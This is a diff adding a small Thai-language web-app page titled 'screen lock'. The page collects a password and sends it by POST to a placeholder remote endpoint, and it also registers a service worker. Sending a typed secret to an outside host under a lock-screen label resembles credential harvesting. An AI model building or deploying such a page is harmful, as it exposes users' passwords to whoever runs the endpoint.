@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ล็อกหน้าจอ</title>
+    <link rel="manifest" href="manifest.json">
+    <script>
+        function sendPassword() {
+            var password = document.getElementById("passwordInput").value;
+            fetch('https://your-firebase-function-url.com/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: password })
+            }).then(response => {
+                if (response.ok) {
+                    alert("บันทึกรหัสแล้ว ล็อกหน้าจอของคุณ!");
+                } else {
+                    alert("เกิดข้อผิดพลาด!");
+                }
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>กรอกรหัสผ่าน</h2>
+    <input type="password" id="passwordInput">
+    <button onclick="sendPassword()">ยืนยัน</button>
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
+    </script>
+</body>
+</html>
